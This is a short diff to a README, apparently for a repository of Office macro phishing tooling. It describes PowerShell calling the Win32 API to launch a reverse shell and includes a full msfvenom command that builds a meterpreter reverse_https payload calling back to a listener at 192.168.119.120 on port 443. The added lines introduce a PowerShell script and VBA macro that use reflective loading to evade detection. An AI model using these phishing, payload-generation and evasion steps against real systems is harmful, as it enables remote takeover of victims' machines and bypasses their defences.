@@ -22,3 +22,8 @@ using powershell to call win32 api to execute reverse shell
 To prevent termination added wait forever 
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
 ![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/16262bf9-823f-4ef6-a482-64ecb68ecbf8)
+
+
+run2.ps1 and auto.vba
+Without calling the add-type function and using reflective technique to evade. 
+![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/b59c891f-c500-4bd2-9885-ab7af799c861)
